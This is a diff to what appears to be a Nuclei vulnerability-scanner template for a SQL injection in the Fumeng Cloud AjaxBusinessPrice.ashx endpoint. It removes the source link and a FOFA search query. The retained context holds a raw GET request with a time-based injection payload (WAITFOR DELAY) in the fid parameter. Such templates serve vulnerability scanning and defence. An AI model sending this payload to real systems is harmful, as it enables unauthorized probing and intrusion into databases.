@@ -3,12 +3,8 @@ info:
   name: 孚盟云 AjaxBusinessPrice 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lv4wp77wzlou6ylp'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: lv4wp77wzlou6ylp
-    fofa: app="孚盟软件-孚盟云"
 http:
 - raw:
   - 'GET /m/Dingding/Ajax/AjaxBusinessPrice.ashx?action=GetBmailByFid&fid=-1'';WAITFOR+DELAY+''0:0:5''-- HTTP/1.1
